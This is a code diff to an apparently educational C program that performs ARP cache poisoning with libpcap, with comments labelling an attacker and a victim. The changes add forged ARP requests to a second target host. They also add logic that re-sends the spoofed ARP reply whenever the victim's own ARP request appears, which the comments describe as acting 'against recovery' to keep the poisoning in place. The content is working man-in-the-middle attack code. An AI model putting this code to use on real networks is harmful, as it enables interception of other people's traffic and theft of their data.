@@ -7,6 +7,7 @@
 #include <sys/ioctl.h> 
 #include <net/if.h>  
 #include <unistd.h> 
+#include <time.h>
 #include "protocol_structure.h"
 #include "printarr.h"
 #include "protocol_check.h"
@@ -52,7 +53,8 @@ int main(int argc, char* argv[]) {
   struct sniff_ethernet *ethernet;
   struct sniff_arp *arp;
 
-  char arp_request_packet[42];    
+  char arp_request_sender_packet[42];    
+  char arp_request_target_packet[42]; 
   char arp_reply_packet[42];
 
   char* ip_sender_str = argv[2];      // readable ip 
@@ -116,9 +118,9 @@ int main(int argc, char* argv[]) {
   if (success) memcpy(mac_attacker, ifr.ifr_hwaddr.sa_data, 6);
   /*************************************************************************************************/
     
-  /*        Set Arp request packet      */
-  ethernet_request = (struct sniff_ethernet*)arp_request_packet;
-  arp_request = (struct sniff_arp*)(arp_request_packet+14);
+  /*        Set Arp request packet to sender      */
+  ethernet_request = (struct sniff_ethernet*)arp_request_sender_packet;
+  arp_request = (struct sniff_arp*)(arp_request_sender_packet+14);
 
   strcpy((char*)(ethernet_request->ether_dhost) , mac_broadcast);
   memcpy((ethernet_request->ether_shost) , mac_attacker ,6);  		// strcpy doesn't work so i use memcpy
@@ -132,7 +134,26 @@ int main(int argc, char* argv[]) {
   memcpy(arp_request->sha , mac_attacker ,6); 			               	// strcpy doesn't work so i use memcpy
   strcpy(arp_request->spa , ip_attacker);
   strcpy(arp_request->tha , mac_sender);
-  strcpy(arp_request->tpa , ip_sender);
+  strcpy(arp_request->tpa , ip_sender);                             // send packet to sender
+/*************************************************************************************************/
+
+  /*        Set Arp request packet to target      */
+  ethernet_request = (struct sniff_ethernet*)arp_request_target_packet;
+  arp_request = (struct sniff_arp*)(arp_request_target_packet+14);
+
+  strcpy((char*)(ethernet_request->ether_dhost) , mac_broadcast);
+  memcpy((ethernet_request->ether_shost) , mac_attacker ,6);      // strcpy doesn't work so i use memcpy
+  ethernet_request->ether_type = swap_word_endian(ETHERTYPE_ARP);
+
+  arp_request->htype = swap_word_endian(ARP_HTYPE);
+  arp_request->ptype = swap_word_endian(ARP_PTYPE);
+  arp_request->hlen = ARP_HLEN;
+  arp_request->plen = ARP_PLEN;
+  arp_request->oper = swap_word_endian(ARP_OPER_REQ);
+  memcpy(arp_request->sha , mac_attacker ,6);                       // strcpy doesn't work so i use memcpy
+  strcpy(arp_request->spa , ip_attacker);
+  strcpy(arp_request->tha , mac_sender);
+  strcpy(arp_request->tpa , ip_target);                             // send packet to target
 /*************************************************************************************************/
 
   /*        Set Arp reply packet      */
@@ -154,8 +175,10 @@ int main(int argc, char* argv[]) {
   strcpy(arp_reply->tpa , ip_sender);                             // Sender ip (Victim)
 /*************************************************************************************************/
 
-  printf("send arp request\n");
-  pcap_sendpacket(handle ,(unsigned char*)arp_request_packet , 42);
+  printf("send arp request to sender\n");
+  pcap_sendpacket(handle ,(unsigned char*)arp_request_sender_packet , 42);
+  printf("send arp request to target\n");
+  pcap_sendpacket(handle ,(unsigned char*)arp_request_target_packet , 42);
 
   while (true) {
     res = pcap_next_ex(handle, &header, &packet);
@@ -168,14 +191,21 @@ int main(int argc, char* argv[]) {
       && swap_word_endian(arp->oper) == ARP_OPER_REP	         // Is it arp reply ?
       &&!strcmp(arp->spa , ip_sender)	 )                        // Is it sender ip (victim)?
     {
+      //printarr((u_char *)arp->spa,6);
       memcpy(mac_sender , arp->sha , 6);		                              // Get sender(victim) mac address
       memcpy((char*)(ethernet_reply->ether_dhost) , mac_sender , 6);  // Set sender(victim) mac address in arp reply
       memcpy(arp_reply->tha , mac_sender , 6);                            // Set sender(victim) mac address in arp reply
-
       printf("send arp reply packet\n");
-      pcap_sendpacket(handle ,(unsigned char*)arp_reply_packet , 42);
+      pcap_sendpacket(handle ,(unsigned char*)arp_reply_packet , 42);  
     }
 
+    if(arp_check(swap_word_endian(ethernet->ether_type))    // Check arp sender(victim)'s request packet for recovery 
+      && swap_word_endian(arp->oper) == ARP_OPER_REQ          // Is it arp request?
+      &&!strcmp(arp->spa , ip_sender) )
+    {
+      printf("send arp reply packet against recovery\n");
+      pcap_sendpacket(handle ,(unsigned char*)arp_reply_packet , 42);      
+    }
 
 
     if (res == 0) continue;
